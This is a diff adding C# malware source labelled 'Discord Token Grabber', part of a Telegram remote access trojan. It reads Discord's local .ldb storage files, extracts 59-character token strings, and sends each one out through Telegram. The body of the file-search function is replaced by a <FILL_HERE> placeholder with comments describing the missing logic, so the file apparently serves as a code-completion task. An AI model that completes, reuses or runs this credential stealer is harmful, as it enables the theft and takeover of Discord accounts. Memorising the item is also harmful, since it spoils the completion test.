@@ -1,0 +1,50 @@
+// Author  : NYAN CAT
+// Name    : Discord Token Grabber
+// Contact : https://github.com/NYAN-x-CAT
+
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text.RegularExpressions;
+
+namespace TelegramRAT
+{
+    internal class DiscordGrabber
+    {
+
+        // Get token
+        public static void get()
+        {
+            var files = SearchForFile();
+            if (files.Count == 0)
+            {
+                telegram.sendText("⛔ Didn't find any ldb files");
+                return;
+            }
+            foreach (string token in files)
+            {
+                foreach (Match match in Regex.Matches(token, "[^\"]*"))
+                {
+                    if (match.Length == 59)
+                    {
+                        telegram.sendText($"💎 Discord token: {match.ToString()}");
+                    }
+                }
+            }
+        }
+
+        // Locate *.ldb files
+        private static List<string> SearchForFile()
+        {
+            // LDB file used to locate Discord client.
+            // First, build the path to the Discord client ldb file.
+            // If the path does not exist, send a message notification through Telegram.
+            // Traverse all ldb files in this path and read their contents.
+            // If the file content contains the "okay" string, add the file content to the ldbFiles list.
+            <FILL_HERE>
+            return ldbFiles;
+        }
+
+
+    }
+}
